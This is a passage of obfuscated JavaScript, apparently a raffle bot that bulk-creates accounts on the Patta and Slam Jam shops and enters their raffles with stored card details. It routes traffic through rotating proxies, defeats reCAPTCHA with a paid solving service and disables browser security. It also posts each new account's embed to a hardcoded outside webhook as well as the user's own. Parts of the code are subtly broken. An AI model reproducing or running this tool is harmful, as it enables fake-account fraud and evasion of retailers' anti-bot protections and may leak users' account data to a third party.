            console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Task\x20' + (_0x3ff9a4 + 0x1) + '\x20:\x20' + _0xeb7d29));
        } finally {
            _0x1b4362 && _0x1b4362['close'](), console['log']('Waiting\x20for\x20' + _0x202e3d['delay'] + '\x20ms'), await _0x1f4682(_0x202e3d['delay']);
        }
    }
}
async function _0xa11f65(_0xd0ed7d, _0x1096bf, _0x3f04fe, _0x1f26a5) {
    _0x3d4a9f['use'](_0x42d8ce()), _0x3d4a9f['use'](_0x484dec({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x202e3d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x5f2557 = 0x0; _0x5f2557 < _0x3f04fe['length']; _0x5f2557++) {
        var _0x4ea6f5 = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x1b651e
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x202e3d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x49eea2
                }
            ]
        }];
        const _0x212d98 = { 'embeds': _0x4ea6f5 };
        _0x4dc5fe(_0x1096bf['name'] + '\x20Task\x20' + (_0x5f2557 + 0x1) + '\x20/\x20' + _0x3f04fe['length'] + '\x20||\x20File:\x20' + _0x3733f2 + '\x20Proxies:\x20' + _0xc68ec8), await _0x2a3946(_0x3f04fe, _0x5f2557);
        var _0x9511be = await _0x2221dc(_0x3f04fe[_0x5f2557], _0x1096bf, 'acc', ![]);
        const _0x2f0047 = { 'succesDEVMSG': { 'embeds': [_0x9511be] } };
        if (_0x3f04fe[_0x5f2557]['Email'] == '' || _0x3f04fe[_0x5f2557]['FirstName'] == '' || _0x3f04fe[_0x5f2557]['LastName'] == '') {
            console['log'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Task\x20' + (_0x5f2557 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x1f4682(0x7d0);
            continue;
        }
        (_0x3f04fe[_0x5f2557]['Password'] == '' || _0x3f04fe[_0x5f2557] == undefined) && _0x3f04fe[_0x5f2557]['Password'] == 'JRaffles23!';
        if (_0x202e3d['useRandomProxy'] = ![])
            var _0x531222 = _0x1f26a5[_0x5f2557]['split'](':');
        else
            var _0x4f3933 = Math['round'](Math['random']() * (_0x1f26a5['length'] - 0x1)), _0x531222 = _0x1f26a5[_0x4f3933]['split'](':');
        const _0x1a3f09 = await _0x3d4a9f['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x531222[0x0] + ':' + _0x531222[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x12a33a = await _0x1a3f09['newPage']();
            await _0x12a33a['authenticate']({
                'username': '' + _0x531222[0x2],
                'password': '' + _0x531222[0x3]
            }), console['log'](_0x3a3ee9() + '\x20[' + _0x1096bf['name'] + ']\x20Task\x20' + (_0x5f2557 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x12a33a['setRequestInterception'](!![]), _0x12a33a['on']('request', _0x5d964b => {
                _0x5d964b['resourceType']() === 'image' || _0x5d964b['resourceType']() === 'font' || _0x5d964b['resourceType']() === 'media' ? _0x5d964b['abort']() : _0x5d964b['continue']();
            }), await _0x12a33a['goto'](_0xd0ed7d), await _0x1f4682(0xbb8), await _0x12a33a['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x3a3ee9() + '\x20[' + _0x1096bf['name'] + ']\x20Task\x20' + (_0x5f2557 + 0x1) + '\x20:\x20Filling\x20information'), await _0x12a33a['type']('#RegisterForm-FirstName', '' + _0x3f04fe[_0x5f2557]['FirstName']), await _0x1f4682(0x226), await _0x12a33a['type']('#RegisterForm-LastName', '' + _0x3f04fe[_0x5f2557]['LastName']), await _0x1f4682(0x226), await _0x12a33a['type']('#RegisterForm-email', '' + _0x3f04fe[_0x5f2557]['Email']), await _0x1f4682(0x226), await _0x12a33a['type']('#RegisterForm-password', '' + _0x3f04fe[_0x5f2557]['Password']), await _0x1f4682(0x226), console['log'](_0x3a3ee9() + '\x20[' + _0x1096bf['name'] + ']\x20Task\x20' + (_0x5f2557 + 0x1) + '\x20:\x20Submitting..'), await _0x12a33a['$eval']('#RegisterForm', _0x1fdc6c => _0x1fdc6c['submit']()), await _0x1f4682(0x1f40);
            try {
                await _0x12a33a['waitForSelector']('.home-page-grid__collection'), await _0x1f4682(0x1f4), console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0x1096bf['name'] + ']\x20Task\x20' + (_0x5f2557 + 0x1) + '\x20:\x20Account\x20' + _0x3f04fe[_0x5f2557]['Email'] + '\x20Generated!')), _0x1da89f['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x3f04fe[_0x5f2557]['Email'] + ',' + _0x3f04fe[_0x5f2557]['Password']), console['log'](_0xeca352['yellow'](_0x3a3ee9() + '\x20[' + _0x1096bf['name'] + ']\x20Task\x20' + (_0x5f2557 + 0x1) + '\x20:\x20Account\x20' + _0x3f04fe[_0x5f2557]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                try {
                    _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x2f0047['succesDEVMSG']);
                } catch {
                }
                await _0x10557a(_0x16cb69, _0x2f0047['succesDEVMSG']);
            } catch (_0x38fc32) {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Task\x20' + (_0x5f2557 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x38fc32));
            }
        } catch (_0x2bb44c) {
            console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Task\x20' + (_0x5f2557 + 0x1) + '\x20:\x20' + _0x2bb44c));
        } finally {
            _0x1a3f09 && _0x1a3f09['close'](), console['log']('Waiting\x20for\x20' + _0x202e3d['delay'] + '\x20ms'), await _0x1f4682(_0x202e3d['delay']);
        }
    }
}
async function _0x493f69(_0x51156c, _0x1f6ba0, _0x26e6cb, _0x1fb438) {
    _0x3d4a9f['use'](_0x42d8ce()), _0x3d4a9f['use'](_0x484dec({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x202e3d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4d5caf = 0x0; _0x4d5caf < _0x26e6cb['length']; _0x4d5caf++) {
        var _0x298408, _0x1b424f = '', _0x394eb6 = 0x0;
        _0x4dc5fe(_0x1f6ba0['name'] + '\x20Task\x20' + (_0x4d5caf + 0x1) + '\x20/\x20' + _0x26e6cb['length'] + '\x20||\x20File:\x20' + _0x3733f2 + '\x20Proxies:\x20' + _0xc68ec8), await _0x2a3946(_0x26e6cb, _0x4d5caf);
        if (_0x26e6cb[_0x4d5caf]['Email'] == '' || _0x26e6cb[_0x4d5caf]['Password'] == '' || _0x26e6cb[_0x4d5caf]['FirstName'] == '' || _0x26e6cb[_0x4d5caf]['LastName'] == '') {
            console['log'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Task\x20' + (_0x4d5caf + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x202e3d['useRandomProxy'] = ![])
            var _0x95aecf = _0x1fb438[_0x4d5caf]['split'](':');
        else
            var _0x367787 = Math['round'](Math['random']() * (_0x1fb438['length'] - 0x1)), _0x95aecf = _0x1fb438[_0x367787]['split'](':');
        const _0x77ab7d = await _0x3d4a9f['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x95aecf[0x0] + ':' + _0x95aecf[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0xb24171 = await _0x77ab7d['newPage']();
            await _0xb24171['authenticate']({
                'username': '' + _0x95aecf[0x2],
                'password': '' + _0x95aecf[0x3]
            }), console['log'](_0x3a3ee9() + '\x20[' + _0x1f6ba0['name'] + ']\x20Task\x20' + (_0x4d5caf + 0x1) + '\x20:\x20Getting\x20Session'), await _0xb24171['setRequestInterception'](!![]), _0xb24171['on']('request', _0x258689 => {
                _0x258689['resourceType']() === 'image' || _0x258689['resourceType']() === 'font' || _0x258689['resourceType']() === 'media' ? _0x258689['abort']() : _0x258689['continue']();
            }), await _0xb24171['goto']('https://www.patta.nl/nl/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0xb24171['waitForSelector']('#CustomerEmail'), console['log'](_0x3a3ee9() + '\x20[' + _0x1f6ba0['name'] + ']\x20Task\x20' + (_0x4d5caf + 0x1) + '\x20:\x20Logging\x20in..'), await _0xb24171['type']('#CustomerEmail', '' + _0x26e6cb[_0x4d5caf]['Email']), await _0x1f4682(0x12c), await _0xb24171['type']('#CustomerPassword', '' + _0x26e6cb[_0x4d5caf]['Password']), await _0x1f4682(0x226), await _0xb24171['$eval']('#customer_login', _0x42ccbc => _0x42ccbc['submit']());
            try {
                await _0xb24171['waitForSelector']('#orders'), await _0x1f4682(0x4b0);
            } catch {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x1f6ba0['name'] + ']\x20Task\x20' + (_0x4d5caf + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0xb24171['goto']('' + _0x26e6cb[_0x4d5caf]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x1f4682(0xbb8), console['log'](_0x3a3ee9() + '\x20[' + _0x1f6ba0['name'] + ']\x20Task\x20' + (_0x4d5caf + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0xb24171['waitForSelector']('#email');
            } catch {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x1f6ba0['name'] + ']\x20Task\x20' + (_0x4d5caf + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
            }
            await _0xb24171['type']('#email', '' + _0x26e6cb[_0x4d5caf]['Email']), await _0x1f4682(0x384), await _0xb24171['type']('#first_name', '' + _0x26e6cb[_0x4d5caf]['FirstName']), await _0x1f4682(0x514), await _0xb24171['type']('#last_name', '' + _0x26e6cb[_0x4d5caf]['LastName']), await _0x1f4682(0x514), await _0xb24171['type']('#street_address', _0x26e6cb[_0x4d5caf]['Address1'] + '\x20' + _0x26e6cb[_0x4d5caf]['HouseNumber'] + '\x20' + _0x26e6cb[_0x4d5caf]['Address2']), await _0x1f4682(0x2bc);
            _0x26e6cb[_0x4d5caf]['Postcode'] == undefined && (_0x26e6cb[_0x4d5caf]['Postcode'] = _0x26e6cb[_0x4d5caf]['Zip']);
            await _0xb24171['type']('#zip_code', '' + _0x26e6cb[_0x4d5caf]['Postcode']), await _0x1f4682(0x320), await _0xb24171['type']('#city', '' + _0x26e6cb[_0x4d5caf]['City']), await _0x1f4682(0x320), await _0xb24171['type']('#bday', '01/01/1994'), await _0x1f4682(0x320), await _0xb24171['type']('#instagram', '' + _0x26e6cb[_0x4d5caf]['Follower']), await _0x1f4682(0x352);
            if (_0x26e6cb[_0x4d5caf]['Size'] == 'RANDOM') {
                const _0x131a3c = await _0xb24171['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x1e8a73 => {
                    return _0x1e8a73['map'](_0x20b29a => _0x20b29a['textContent']);
                });
                var _0x224cdb = Math['round'](Math['random']() * (_0x131a3c['length'] - 0x1));
                console['log'](_0x3a3ee9() + '\x20[' + _0x1f6ba0['name'] + ']\x20Task\x20' + (_0x4d5caf + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x131a3c[_0x224cdb]), await _0xb24171['click']('label[data-eu-size=\x22' + _0x131a3c[_0x224cdb] + '\x22]');
            } else {
                console['log'](_0x3a3ee9() + '\x20[' + _0x1f6ba0['name'] + ']\x20Task\x20' + (_0x4d5caf + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x26e6cb[_0x4d5caf]['Size']);
                try {
                    await _0xb24171['click']('label[data-eu-size=\x22' + _0x26e6cb[_0x4d5caf]['Size'] + '\x22]');
                } catch {
                    await _0xb24171['click']('label[data-eu-size=\x22' + _0x26e6cb[_0x4d5caf]['Size'] + '.0\x22]');
                }
            }
            await _0x1f4682(0xbb8), await _0xb24171['$$eval']('.raffle__checkbox-label', _0x401bb2 => _0x401bb2['forEach'](_0x52567d => _0x52567d['click']())), await _0x1f4682(0x7d0), console['log'](_0x3a3ee9() + '\x20[' + _0x1f6ba0['name'] + ']\x20Task\x20' + (_0x4d5caf + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0xb24171['click']('#raffle__form-submit'), await _0x1f4682(0x1388);
            try {
                await _0xb24171['waitForSelector']('#raffle__confirmation-message-container'), console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0x1f6ba0['name'] + ']\x20Task\x20' + (_0x4d5caf + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x240cbf) {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Task\x20' + (_0x4d5caf + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x240cbf));
            }
        } catch (_0x3d6c82) {
            console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Task\x20' + (_0x4d5caf + 0x1) + '\x20:\x20' + _0x3d6c82)), _0x1b424f = 'yes';
        } finally {
            _0x77ab7d && _0x77ab7d['close']();
            if (_0x1b424f == 'yes' && _0x394eb6 != 0x5) {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x1f6ba0['name'] + ']\x20Task\x20' + (_0x4d5caf + 0x1) + '\x20:\x20Retrying')), _0x4d5caf = _0x4d5caf - 0x1, _0x394eb6 = _0x394eb6 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x202e3d['delay'] + '\x20ms'), await _0x1f4682(_0x202e3d['delay']);
        }
    }
}
async function _0x17a79d(_0x3e6631, _0x11a18d, _0x3a192f, _0x2e1604) {
    _0x3d4a9f['use'](_0x42d8ce()), _0x3d4a9f['use'](_0x484dec({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x202e3d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x12b291 = 0x0; _0x12b291 < _0x3a192f['length']; _0x12b291++) {
        var _0x1101aa = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x1b651e
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x202e3d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x49eea2
                }
            ]
        }];
        const _0x55db45 = { 'embeds': _0x1101aa };
        _0x4dc5fe(_0x11a18d['name'] + '\x20Task\x20' + (_0x12b291 + 0x1) + '\x20/\x20' + _0x3a192f['length'] + '\x20||\x20File:\x20' + _0x3733f2 + '\x20Proxies:\x20' + _0xc68ec8), await _0x2a3946(_0x3a192f, _0x12b291);
        var _0x45c6a0 = await _0x2221dc(_0x3a192f[_0x12b291], _0x11a18d, 'acc', ![]);
        const _0x2afa40 = { 'succesDEVMSG': { 'embeds': [_0x45c6a0] } };
        if (_0x3a192f[_0x12b291]['Email'] == '' || _0x3a192f[_0x12b291]['FirstName'] == '' || _0x3a192f[_0x12b291]['LastName'] == '') {
            console['log'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Task\x20' + (_0x12b291 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x1f4682(0x7d0);
            continue;
        }
        (_0x3a192f[_0x12b291]['Password'] == '' || _0x3a192f[_0x12b291] == undefined) && _0x3a192f[_0x12b291]['Password'] == 'JRaffles23!';
        if (_0x202e3d['useRandomProxy'] = ![])
            var _0x11a2b6 = _0x2e1604[_0x12b291]['split'](':');
        else
            var _0xd42510 = Math['round'](Math['random']() * (_0x2e1604['length'] - 0x1)), _0x11a2b6 = _0x2e1604[_0xd42510]['split'](':');
        const _0x245517 = await _0x3d4a9f['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x11a2b6[0x0] + ':' + _0x11a2b6[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x2a81b4 = await _0x245517['newPage']();
            await _0x2a81b4['authenticate']({
                'username': '' + _0x11a2b6[0x2],
                'password': '' + _0x11a2b6[0x3]
            }), console['log'](_0x3a3ee9() + '\x20[' + _0x11a18d['name'] + ']\x20Task\x20' + (_0x12b291 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2a81b4['setRequestInterception'](!![]), _0x2a81b4['on']('request', _0x47ca2c => {
                _0x47ca2c['resourceType']() === 'image' || _0x47ca2c['resourceType']() === 'font' || _0x47ca2c['resourceType']() === 'media' ? _0x47ca2c['abort']() : _0x47ca2c['continue']();
            }), await _0x2a81b4['goto']('https://drop.slamjam.com/account/register'), await _0x1f4682(0xbb8), await _0x2a81b4['waitForSelector']('#FirstName'), await _0x2a81b4['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2a81b4['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x3a3ee9() + '\x20[' + _0x11a18d['name'] + ']\x20Task\x20' + (_0x12b291 + 0x1) + '\x20:\x20Filling\x20information'), await _0x1f4682(0x4b0), await _0x2a81b4['type']('#FirstName', '' + _0x3a192f[_0x12b291]['FirstName']), await _0x1f4682(0x226), await _0x2a81b4['type']('#LastName', '' + _0x3a192f[_0x12b291]['LastName']), await _0x1f4682(0x226), await _0x2a81b4['type']('#Email', '' + _0x3a192f[_0x12b291]['Email']), await _0x1f4682(0x2ee), await _0x2a81b4['type']('#ConfirmEmail', '' + _0x3a192f[_0x12b291]['Email']), await _0x1f4682(0x2ee), await _0x2a81b4['type']('#CreatePassword', '' + _0x3a192f[_0x12b291]['Password']), await _0x1f4682(0x2ee), await _0x2a81b4['type']('#CreateConfirmPassword', '' + _0x3a192f[_0x12b291]['Password']), await _0x1f4682(0x226), console['log'](_0x3a3ee9() + '\x20[' + _0x11a18d['name'] + ']\x20Task\x20' + (_0x12b291 + 0x1) + '\x20:\x20Submitting..'), await _0x2a81b4['$eval']('#create_customer', _0x447e14 => _0x447e14['submit']()), await _0x1f4682(0x1388), console['log'](_0x3a3ee9() + '\x20[' + _0x11a18d['name'] + ']\x20Task\x20' + (_0x12b291 + 0x1) + '\x20:\x20' + _0xeca352['cyan']('Solving\x20Captcha')), await _0x2a81b4['solveRecaptchas'](), console['log'](_0x3a3ee9() + '\x20[' + _0x11a18d['name'] + ']\x20Task\x20' + (_0x12b291 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x2a81b4['$eval']('.shopify-challenge__container\x20>\x20form', _0x162c08 => _0x162c08['submit']());
            try {
                await _0x2a81b4['waitForSelector']('.product-card__image'), await _0x1f4682(0x1f4), console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0x11a18d['name'] + ']\x20Task\x20' + (_0x12b291 + 0x1) + '\x20:\x20Account\x20' + _0x3a192f[_0x12b291]['Email'] + '\x20Generated!')), _0x1da89f['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x3a192f[_0x12b291]['Email'] + ',' + _0x3a192f[_0x12b291]['Password']), console['log'](_0xeca352['yellow'](_0x3a3ee9() + '\x20[' + _0x11a18d['name'] + ']\x20Task\x20' + (_0x12b291 + 0x1) + '\x20:\x20Account\x20' + _0x3a192f[_0x12b291]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                try {
                    _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x2afa40['succesDEVMSG']);
                } catch {
                }
                await _0x10557a(_0x16cb69, _0x2afa40['succesDEVMSG']);
            } catch (_0x4242d4) {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Task\x20' + (_0x12b291 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x4242d4));
            }
        } catch (_0xbbc581) {
            console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Task\x20' + (_0x12b291 + 0x1) + '\x20:\x20' + _0xbbc581));
        } finally {
            _0x245517 && _0x245517['close'](), console['log']('Waiting\x20for\x20' + _0x202e3d['delay'] + '\x20ms'), await _0x1f4682(_0x202e3d['delay']);
        }
    }
}
async function _0x1d9621(_0x5f41ca, _0x5ca785, _0x1ac722, _0x53ecca) {
    _0x3d4a9f['use'](_0x42d8ce()), _0x3d4a9f['use'](_0x484dec({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x202e3d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2f8284 = 0x0; _0x2f8284 < _0x1ac722['length']; _0x2f8284++) {
        var _0x3ed547, _0x4638ba = '', _0x5dc3a3 = 0x0;
        _0x4dc5fe(_0x5ca785['name'] + '\x20Task\x20' + (_0x2f8284 + 0x1) + '\x20/\x20' + _0x1ac722['length'] + '\x20||\x20File:\x20' + _0x3733f2 + '\x20Proxies:\x20' + _0xc68ec8), await _0x2a3946(_0x1ac722, _0x2f8284);
        if (_0x1ac722[_0x2f8284]['Email'] == '' || _0x1ac722[_0x2f8284]['Password'] == '' || _0x1ac722[_0x2f8284]['FirstName'] == '' || _0x1ac722[_0x2f8284]['LastName'] == '') {
            console['log'](_0x3a3ee9() + '\x20[' + _0x5ca785['name'] + ']\x20Task\x20' + (_0x2f8284 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x202e3d['useRandomProxy'] = ![])
            var _0x11b806 = _0x53ecca[_0x2f8284]['split'](':');
        else
            var _0x529e47 = Math['round'](Math['random']() * (_0x53ecca['length'] - 0x1)), _0x11b806 = _0x53ecca[_0x529e47]['split'](':');
        const _0x23c102 = await _0x3d4a9f['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x11b806[0x0] + ':' + _0x11b806[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials'
            ]
        });
        try {
            const _0x240c2c = await _0x23c102['newPage']();
            await _0x240c2c['authenticate']({
                'username': '' + _0x11b806[0x2],
                'password': '' + _0x11b806[0x3]
            }), await _0x240c2c['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), console['log'](_0x3a3ee9() + '\x20[' + _0x5ca785['name'] + ']\x20Task\x20' + (_0x2f8284 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x240c2c['setRequestInterception'](!![]), _0x240c2c['on']('request', _0x2c7ca7 => {
                _0x2c7ca7['resourceType']() === 'image' || _0x2c7ca7['resourceType']() === 'font' || _0x2c7ca7['resourceType']() === 'media' ? _0x2c7ca7['abort']() : _0x2c7ca7['continue']();
            }), await _0x240c2c['goto']('https://drop.slamjam.com/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x240c2c['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x240c2c['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1f4682(0x258), await _0x240c2c['waitForSelector']('#CustomerEmail'), console['log'](_0x3a3ee9() + '\x20[' + _0x5ca785['name'] + ']\x20Task\x20' + (_0x2f8284 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x240c2c['type']('#CustomerEmail', '' + _0x1ac722[_0x2f8284]['Email']), await _0x1f4682(0x12c), await _0x240c2c['type']('#CustomerPassword', '' + _0x1ac722[_0x2f8284]['Password']), await _0x1f4682(0x226), await _0x240c2c['$eval']('#customer_login', _0x3f4243 => _0x3f4243['submit']()), await _0x1f4682(0x7d0), await _0x240c2c['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x3a3ee9() + '\x20[' + _0x5ca785['name'] + ']\x20Task\x20' + (_0x2f8284 + 0x1) + '\x20:\x20' + _0xeca352['cyan']('Solving\x20Captcha')), await _0x240c2c['solveRecaptchas'](), console['log'](_0x3a3ee9() + '\x20[' + _0x5ca785['name'] + ']\x20Task\x20' + (_0x2f8284 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x240c2c['$eval']('.shopify-challenge__container\x20>\x20form', _0xafffb3 => _0xafffb3['submit']());
            try {
                await _0x240c2c['waitForSelector']('.nav-account'), await _0x1f4682(0x4b0);
            } catch {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x5ca785['name'] + ']\x20Task\x20' + (_0x2f8284 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x240c2c['goto']('' + _0x1ac722[_0x2f8284]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x1f4682(0xbb8), console['log'](_0x3a3ee9() + '\x20[' + _0x5ca785['name'] + ']\x20Task\x20' + (_0x2f8284 + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x240c2c['waitForSelector']('#ProductSelect-product-template-raffle');
            } catch {
            }
            await _0x240c2c['click']('.product-select-variant-wrapper'), await _0x1f4682(0x320), await _0x240c2c['click']('li.product-select-variant__value[data-size=\x22' + _0x1ac722[_0x2f8284]['Size'] + '\x22]'), await _0x1f4682(0x384), await _0x240c2c['$eval']('#AddToCartForm-product-template-raffle', _0x30549b => _0x30549b['submit']()), await _0x240c2c['waitForSelector']('.cart-order-summary__content'), await _0x1f4682(0x514), await _0x240c2c['goto']('https://drop.slamjam.com/checkout'), await _0x1f4682(0x514), await _0x240c2c['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x3a3ee9() + '\x20[' + _0x5ca785['name'] + ']\x20Task\x20' + (_0x2f8284 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x240c2c['select']('#checkout_shipping_address_country', '' + _0x1ac722[_0x2f8284]['Country']), await _0x1f4682(0x200), await _0x240c2c['waitForSelector']('#checkout_shipping_address_first_name'), await _0x240c2c['type']('#checkout_shipping_address_first_name', '' + _0x1ac722[_0x2f8284]['FirstName']), await _0x1f4682(0x237), await _0x240c2c['type']('#checkout_shipping_address_last_name', '' + _0x1ac722[_0x2f8284]['LastName']), await _0x1f4682(0x1e0), await _0x240c2c['type']('#checkout_shipping_address_address1', _0x1ac722[_0x2f8284]['Address1'] + '\x20' + _0x1ac722[_0x2f8284]['HouseNumber']), await _0x1f4682(0x514), await _0x240c2c['type']('#checkout_shipping_address_address2', '' + _0x1ac722[_0x2f8284]['Address2']), await _0x1f4682(0x514);
            _0x1ac722[_0x2f8284]['Postcode'] == undefined && (_0x1ac722[_0x2f8284]['Postcode'] = _0x1ac722[_0x2f8284]['Zip']);
            await _0x240c2c['type']('#checkout_shipping_address_zip', '' + _0x1ac722[_0x2f8284]['Postcode']), await _0x1f4682(0x2bc), await _0x240c2c['type']('#checkout_shipping_address_city', '' + _0x1ac722[_0x2f8284]['City']), await _0x1f4682(0x320), await _0x240c2c['type']('#checkout_shipping_address_phone', '' + _0x1ac722[_0x2f8284]['Phone']), await _0x1f4682(0x320), await _0x240c2c['click']('#continue_button'), await _0x1f4682(0xbb8), await _0x240c2c['waitForSelector']('.summary-title'), await _0x1f4682(0x320), await _0x240c2c['click']('#continue_button'), await _0x1f4682(0x320), console['log'](_0x3a3ee9() + '\x20[' + _0x5ca785['name'] + ']\x20Task\x20' + (_0x2f8284 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x240c2c['waitForSelector']('#checkout_credit_card_vault'), await _0x1f4682(0x3e8);
            var _0xdee23b = await _0x240c2c['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x1858f6 = await _0xdee23b['contentFrame']();
            await _0x1858f6['click']('#number'), await _0x1f4682(0x3e8), await _0x1858f6['type']('#number', '' + _0x1ac722[_0x2f8284]['CardNumber'], { 'delay': 0x78 }), _0xdee23b = await _0x240c2c['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x1858f6 = await _0xdee23b['contentFrame'](), await _0x1f4682(0x1c2), await _0x1858f6['click']('#name'), await _0x1f4682(0x1f4), await _0x1858f6['type']('#name', '' + _0x1ac722[_0x2f8284]['NameOnCard'], { 'delay': 0x78 }), _0xdee23b = await _0x240c2c['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x1858f6 = await _0xdee23b['contentFrame'](), await _0x1f4682(0x1c2), await _0x1858f6['click']('#expiry'), await _0x1f4682(0x1f4), await _0x1858f6['type']('#expiry', '' + _0x1ac722[_0x2f8284]['ExpiryDate'], { 'delay': 0x78 }), _0xdee23b = await _0x240c2c['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x1858f6 = await _0xdee23b['contentFrame'](), await _0x1f4682(0x1c2), await _0x1858f6['click']('#verification_value'), await _0x1f4682(0x1f4), await _0x1858f6['type']('#verification_value', '' + _0x1ac722[_0x2f8284]['CVV'], { 'delay': 0x78 }), await _0x240c2c['$eval']('#accepts-flag-raffle', _0x4eefb8 => _0x4eefb8['click']()), await _0x1f4682(0x7d0), console['log'](_0x3a3ee9() + '\x20[' + _0x5ca785['name'] + ']\x20Task\x20' + (_0x2f8284 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x240c2c['$eval']('#continue_button', _0x2e6b61 => 